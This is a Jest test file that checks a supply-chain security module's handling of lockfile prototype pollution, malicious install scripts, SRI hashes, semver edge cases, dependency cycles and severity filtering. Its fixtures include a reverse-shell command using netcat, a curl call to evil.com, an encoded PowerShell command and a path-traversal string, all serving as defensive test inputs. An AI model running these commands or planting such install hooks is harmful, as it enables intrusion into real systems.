'use strict';

const {
  DependencyGraph,
  VulnerabilityIntelligenceEngine,
  PackageIntegrityEngine,
  SbomEngine,
  LicenseComplianceEngine,
  MaliciousPackageEngine,
  compareSemver,
  satisfiesRange,
  verifySriHash,
} = require('../../src/supply_chain');

describe('Supply Chain Adversarial & Robustness Verification', () => {
  test('Adversarial: Prototype pollution attempts in lockfile packages', () => {
    const maliciousLockfile = {
      name: 'polluter',
      version: '1.0.0',
      packages: {
        '__proto__': { name: 'polluted', resolved: 'http://evil.com' },
        'constructor': { name: 'constructor-attack' },
      },
    };

    const engine = new PackageIntegrityEngine();
    // Should safely execute without throwing unhandled prototype exception or polluting global Object
    const result = engine.auditLockfileIntegrity(maliciousLockfile);
    expect(result).toBeDefined();
    expect(Object.prototype.polluted).toBeUndefined();
  });

  test('Adversarial: Obfuscated and case-variant dangerous lifecycle scripts', () => {
    const engine = new MaliciousPackageEngine();

    const variants = [
      { name: 'var-1', scripts: { preinstall: 'NODE -e "process.exit(1)"' } },
      { name: 'var-2', scripts: { postinstall: 'CURL -s http://evil.com' } },
      { name: 'var-3', scripts: { install: 'Powershell.exe -Enc SGVsbG8=' } },
      { name: 'var-4', scripts: { preuninstall: 'nc -e /bin/sh 1.2.3.4 4444' } },
    ];

    for (const pkg of variants) {
      const result = engine.auditLifecycleScripts(pkg);
      expect(result.status).toBe('FAIL');
      expect(result.findingsCount).toBeGreaterThanOrEqual(1);
      expect(result.findings[0].category).toBe('V2_MALICIOUS_PACKAGE_HOOK');
    }
  });

  test('Adversarial: Malformed SRI strings and hash injection', () => {
    expect(verifySriHash('content', '')).toBe(false);
    expect(verifySriHash('content', 'sha512')).toBe(false);
    expect(verifySriHash('content', null)).toBe(false);
    expect(verifySriHash('content', 'invalidalgo-12345')).toBe(false);
    expect(verifySriHash('content', '../../etc/passwd')).toBe(false);
  });

  test('Adversarial: Bizarre and edge-case semver ranges', () => {
    expect(compareSemver('999999999.0.0', '1.0.0')).toBe(1);
    expect(compareSemver('invalid.ver', '1.0.0')).toBe(-1);
    expect(satisfiesRange('1.0.0', '')).toBe(true);
    expect(satisfiesRange('1.0.0', '*')).toBe(true);
    expect(satisfiesRange('1.0.0', '>= NaN')).toBe(false);
  });

  test('Adversarial: Deep cycle in 10-node circular graph', () => {
    const graph = new DependencyGraph();
    const nodeCount = 10;

    for (let i = 0; i < nodeCount; i++) {
      graph.addComponent({
        id: `node-${i}`,
        name: `pkg-${i}`,
        version: '1.0.0',
        purl: `pkg:npm/pkg-${i}@1.0.0`,
        direct: i === 0,
      });
    }

    for (let i = 0; i < nodeCount; i++) {
      const next = (i + 1) % nodeCount;
      graph.addDependencyEdge(`pkg-${i}@1.0.0`, `pkg-${next}@1.0.0`);
    }

    const cycleInfo = graph.detectCycles();
    expect(cycleInfo.hasCycles).toBe(true);
    expect(cycleInfo.cyclesCount).toBeGreaterThanOrEqual(1);
  });

  test('Adversarial: Non-masking safety invariant (ΔCritical = 0)', () => {
    const vulnEngine = new VulnerabilityIntelligenceEngine();
    vulnEngine.loadAdvisories([
      {
        id: 'GHSA-critical-rce',
        schemaVersion: '1.0.0',
        summary: 'Remote Code Execution',
        severity: 'CRITICAL',
        affectedPackage: 'vuln-lib',
        affectedRange: '>= 1.0.0',
        publishedAt: '2026-10-30T00:00:00Z',
      },
    ]);

    // An auditor with minSeverity 'LOW' vs 'CRITICAL' must both preserve the critical finding
    const auditAll = vulnEngine.auditComponents([{ name: 'vuln-lib', version: '1.2.0' }], {
      minSeverity: 'LOW',
    });
    const auditCritOnly = vulnEngine.auditComponents([{ name: 'vuln-lib', version: '1.2.0' }], {
      minSeverity: 'CRITICAL',
    });

    const critInAll = auditAll.findings.filter((f) => f.severity === 'CRITICAL').length;
    const critInFiltered = auditCritOnly.findings.filter((f) => f.severity === 'CRITICAL').length;

    // Delta Critical must be exactly 0
    expect(critInAll - critInFiltered).toBe(0);
    expect(critInAll).toBe(1);
  });
});

